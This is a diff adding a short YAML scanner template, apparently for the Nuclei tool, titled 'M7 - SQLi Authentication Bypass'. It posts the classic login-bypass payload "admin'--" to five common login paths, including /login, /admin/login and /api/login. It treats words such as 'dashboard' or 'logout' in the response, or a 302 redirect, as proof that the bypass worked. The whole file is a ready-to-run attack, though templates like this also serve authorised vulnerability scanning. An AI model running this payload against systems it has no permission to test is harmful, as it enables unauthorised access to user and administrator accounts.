@@ -1,0 +1,36 @@
+id: m7-sqli-auth-bypass
+info:
+  name: M7 - SQLi Authentication Bypass
+  author: Sharlix
+  severity: critical
+  description: SQLi-based login bypass techniques
+  tags: sqli,auth,bypass,m7hunter
+
+requests:
+  - method: POST
+    path:
+      - "{{BaseURL}}/login"
+      - "{{BaseURL}}/signin"
+      - "{{BaseURL}}/auth"
+      - "{{BaseURL}}/admin/login"
+      - "{{BaseURL}}/api/login"
+
+    body: "username=admin'--&password=anything"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "dashboard"
+          - "logout"
+          - "welcome"
+          - "admin"
+          - "profile"
+        part: body
+        condition: or
+
+      - type: dsl
+        dsl:
+          - "status_code == 302 && contains(all_headers, 'Location')"
